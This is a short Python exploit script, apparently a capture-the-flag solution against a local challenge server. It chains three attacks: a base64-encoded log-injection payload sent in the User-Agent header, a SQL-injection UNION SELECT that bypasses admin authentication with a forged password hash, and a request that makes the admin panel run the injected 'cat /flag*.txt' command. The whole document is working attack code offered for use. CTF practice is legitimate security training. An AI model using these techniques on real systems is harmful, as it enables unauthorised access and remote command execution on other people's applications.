#!/usr/bin/env python3
import base64
import hashlib
import requests
import re

HOST = "http://localhost:1337"
COMMAND = "cat /flag*.txt"

s = requests.Session()

payload = f"""a
CRITICAL ERROR! Fix with: {COMMAND}
c"""
encoded = base64.b64encode(payload.encode()).decode()

# Write log
r = s.get(HOST, headers={"User-Agent": f"=?UTF-8?B?{encoded}?="})
print(r.text)

# Auth bypass to read log
password = "x"
hash = hashlib.sha256(password.encode()).hexdigest()
auth_bypass = (f"' UNION SELECT '{hash}' -- ", password)

r = s.get(f"{HOST}/admin", auth=auth_bypass)

# Trigger injected log command to run
line = re.findall(r'name="line" value="(\d+)"', r.text)[0]
print(f"{line=}")

r = s.get(f"{HOST}/admin/run", params={"line": line}, auth=auth_bypass)
print(r.text)
flag = re.search(r"NHC\{[^}]+\}", r.text)
assert flag, r.text
print(flag.group())
